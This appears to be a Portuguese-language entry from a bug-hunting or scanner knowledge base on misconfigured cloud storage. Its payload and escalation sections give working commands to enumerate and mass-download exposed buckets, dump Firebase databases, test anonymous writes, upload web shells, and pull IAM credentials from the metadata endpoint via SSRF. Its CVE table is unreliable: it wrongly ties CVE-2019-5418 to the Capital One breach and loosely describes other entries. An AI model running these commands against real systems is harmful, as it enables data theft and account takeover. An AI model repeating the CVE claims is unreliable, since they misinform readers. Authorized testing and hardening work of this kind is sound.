---
id: cloud_misconfiguration
title: "Cloud Misconfiguration"
module: "CloudMisconfig"
severity: "HIGH"
cwe_id: "CWE-284"
cwe_title: "Improper Access Control"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
vrt_id: "server_security_misconfiguration.cloud_misconfiguration"
---

## Summary
Buckets S3, containers Azure Blob, buckets GCS e databases Firebase com permissoes publicas permitem listagem e download de objetos por qualquer usuario, expondo backups, credenciais, PII e codigo-fonte. Headers cloud-specific revelam provider e infraestrutura.

## Description
Cloud misconfiguration ocorre quando recursos de armazenamento em nuvem sao configurados com permissoes excessivamente permissivas. Os tres principais vetores sao:

- **S3 Bucket Public Listing:** ACL `public-read` ou bucket policy com `s3:ListBucket` para `*` permite enumeracao de todos os objetos. Atacante usa `aws s3 ls s3://bucket --no-sign-request` ou acessa `https://bucket.s3.amazonaws.com/` via browser.
- **Azure Blob Container Listing:** container com access level `Container` ou `Blob` permite listagem via `?restype=container&comp=list`. Dados acessiveis sem autenticacao.
- **GCS Bucket Listing:** bucket com IAM policy `allUsers` ou `allAuthenticatedUsers` permite listagem via `https://storage.googleapis.com/bucket/`.
- **Firebase Open Rules:** Realtime Database com regras `{".read": true}` permite leitura de todos os dados via `https://project.firebaseio.com/.json`. Inclui user data, credenciais, PII e configuracao.
- **Cloud Header Disclosure:** headers como `x-amz-request-id`, `x-goog-hash`, `x-ms-request-id` revelam o cloud provider, auxiliando ataques direcionados.

Enumeracao de buckets: a partir do dominio do alvo, testar sufixos comuns (`-assets`, `-backup`, `-dev`, `-staging`, `-prod`, `-static`, `-media`, `-uploads`, `-public`, `-data`, `-files`, `-logs`, `-images`, `-cdn`). Buckets tambem sao descobertos em respostas HTTP (URLs em HTML, JS, CSS).

Metadata endpoint abuse: instancias EC2/GCE/Azure VM expoe metadata em `http://169.254.169.254/` -- quando combinado com SSRF, permite exfiltrar IAM credentials e tokens de sessao.

## Impact
- Download de todos os objetos do bucket -- backups, banco de dados, credenciais, PII, codigo-fonte.
- Upload de conteudo malicioso em buckets com permissao de escrita (web shell, phishing page).
- Exfiltracao de dados de usuarios via Firebase Realtime Database aberto.
- Enumeracao de infraestrutura via cloud headers.
- Comprometimento de IAM credentials via metadata endpoint (quando combinado com SSRF).
- Custos financeiros elevados por uso nao autorizado de recursos cloud.

## Payloads and Bypasses
```bash
# -- S3 Bucket enumeration e teste --
# Listar objetos (sem autenticacao)
aws s3 ls s3://targetbucket --no-sign-request --region us-east-1
# Via HTTP
curl -s https://targetbucket.s3.amazonaws.com/
# Download de todos os objetos
aws s3 sync s3://targetbucket/ ./loot/ --no-sign-request --region us-east-1
# Teste de escrita
aws s3 cp test.txt s3://targetbucket/test.txt --no-sign-request
# Nome do bucket via %C0 trick
curl -s https://target.com/resources/id%C0

# -- S3 Bucket enumeration por dominio --
for suffix in "" "-assets" "-backup" "-backups" "-dev" "-staging" "-prod" "-static" "-media" "-uploads" "-public" "-data" "-files" "-logs" "-images" "-cdn"; do
  bucket="example.com${suffix}"
  status=$(curl -s -o /dev/null -w '%{http_code}' "https://${bucket}.s3.amazonaws.com/")
  echo "${bucket}: ${status}"
done

# -- Azure Blob container listing --
curl -s "https://account.blob.core.windows.net/container?restype=container&comp=list"

# -- GCS bucket listing --
curl -s "https://storage.googleapis.com/bucket/"

# -- Firebase open rules check --
curl -s "https://project.firebaseio.com/.json?shallow=true"
# Se retorna dados (nao "null" ou 401) = regras abertas

# -- Cloud metadata (via SSRF) --
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/user-data/
# GCE
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# -- Cloud header detection --
curl -sI https://target.com/ | grep -iE 'x-amz-|x-goog-|x-ms-|x-azure-'
```

## Target Context (Crawler Hints)
- **Parametros comuns:** nenhum (scan de URLs cloud em respostas e enumeracao por dominio).
- **Paths comuns:** `/`, `/index.html`, `/api/`, `/assets/`, `/static/`.
- **Sinais:** URLs S3 (`*.s3*.amazonaws.com`), Azure Blob (`*.blob.core.windows.net`), GCS (`storage.googleapis.com`), Firebase (`*.firebaseio.com`) em respostas HTTP; headers cloud-specific (`x-amz-request-id`, `x-goog-hash`, `x-ms-request-id`).

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2019-5418 | Capital One (AWS) | 2019 | SSRF + S3 misconfiguration permitiu exfiltracao de 100M+ registros de clientes via metadata endpoint | S3 + SSRF |
| CVE-2023-20198 | Cisco IOS XE | 2023 | Web UI exposto permitiu acesso a configuracao cloud com credenciais em plaintext | Config exposure |
| CVE-2021-44228 | Log4j (Log4Shell) | 2021 | RCE explorado em massa para exfiltrar credenciais cloud via metadata endpoint | RCE to cloud creds |
| CVE-2024-21887 | Ivanti Connect Secure | 2024 | Auth bypass + command injection usado para exfiltrar AWS credentials em ambientes cloud | Auth bypass to creds |

## Escalation Techniques
- **Leitura massiva de dados:** usar `aws s3 sync` / `azcopy` / `gsutil rsync` para baixar todo o conteudo de buckets publicos -- backups de banco, logs com PII, credenciais em arquivos de config.
- **Upload de web shell:** em buckets com permissao de escrita que servem conteudo estatico (S3 static hosting, Azure Blob static website), fazer upload de pagina HTML/JS maliciosa ou web shell PHP.
- **Pivotar via credenciais encontradas:** arquivos de configuracao em buckets frequentemente contem credenciais de banco, API keys e tokens de servico -- usar para acessar outros sistemas internos.
- **Exfiltrar IAM credentials via metadata:** quando combinado com SSRF, acessar `http://169.254.169.254/latest/meta-data/iam/security-credentials/` para obter temporary credentials com permissoes da instancia EC2 (pode incluir acesso a outros servicos AWS).
- **Firebase data dump:** com rules abertas, extrair todo o banco via `/.json` -- inclui dados de usuarios, tokens, configuracoes. Usar `?shallow=true` para mapear a estrutura antes do dump completo.
- **Escalar para contas cloud:** credenciais AWS/GCP/Azure encontradas em buckets podem dar acesso ao console da cloud com permissoes administrativas.

## Hunting Methodology
1. Identificar cloud provider via headers HTTP (`x-amz-request-id`, `x-goog-hash`, `x-ms-request-id`) e resolucao DNS (CNAME para `s3.amazonaws.com`, `blob.core.windows.net`, `storage.googleapis.com`).
2. Enumerar buckets/containers usando o dominio do alvo + sufixos comuns: `-assets`, `-backup`, `-backups`, `-dev`, `-staging`, `-prod`, `-static`, `-uploads`, `-media`, `-public`, `-data`, `-files`, `-logs`, `-images`, `-cdn`.
3. Para cada bucket descoberto, testar listagem publica: `curl https://bucket.s3.amazonaws.com/` (S3), `?restype=container&comp=list` (Azure), GET direto (GCS).
4. Testar permissao de escrita: `aws s3 cp test.txt s3://bucket/test.txt --no-sign-request` (usar arquivo inofensivo, nao overwrite nada existente).
5. Para Firebase: testar endpoint `/.json` com `GET` sem autenticacao -- resposta diferente de `null` ou `401` indica rules abertas.
6. Analisar JS bundles e source code para URLs de storage hardcoded (regex para `s3.amazonaws.com`, `blob.core.windows.net`, `storage.googleapis.com`, `firebaseio.com`).
7. Se houver SSRF disponivel, testar acesso ao metadata endpoint (`169.254.169.254`) para exfiltrar IAM credentials.

## False Positive Indicators
- Bucket retorna 403 Forbidden -- existe mas nao e publico. Nao e vulnerabilidade de listagem (apenas confirma existencia).
- Bucket com nome generico que pertence a terceiro (e.g., `backup.s3.amazonaws.com` nao pertence ao alvo).
- CDN usa bucket como origin mas acesso direto ao bucket e bloqueado -- o conteudo e publico via CDN por design.
- Firebase retorna `null` ou `401` no `/.json` -- regras estao configuradas corretamente.
- Headers cloud-specific presentes mas sem exposicao de dados -- informational, nao e HIGH sem contexto adicional.
- Bucket de assets estaticos publicos intencionalmente (imagens, CSS, JS do frontend) -- avaliar se contem dados sensiveis antes de reportar.

## Recommendation
1. Bloquear acesso publico a buckets S3 com S3 Block Public Access no nivel da conta AWS.
2. Revisar e remover ACLs e bucket policies excessivamente permissivas (`AllUsers`, `AuthenticatedUsers`).
3. Configurar containers Azure Blob com access level `Private`. Usar SAS tokens com permissoes minimas.
4. Configurar Firebase Security Rules para exigir autenticacao (`"auth != null"`).
5. Remover headers cloud-specific em reverse proxies (Nginx, CloudFront, Cloudflare).
6. Habilitar logging de acesso em todos os servicos de storage (S3 Access Logs, Azure Analytics, Cloud Audit Logs).
7. Implementar monitoramento continuo de permissoes cloud com ferramentas como ScoutSuite, Prowler, CloudSploit.
8. Usar IMDSv2 (Instance Metadata Service v2) em EC2 para prevenir exfiltracao via SSRF.
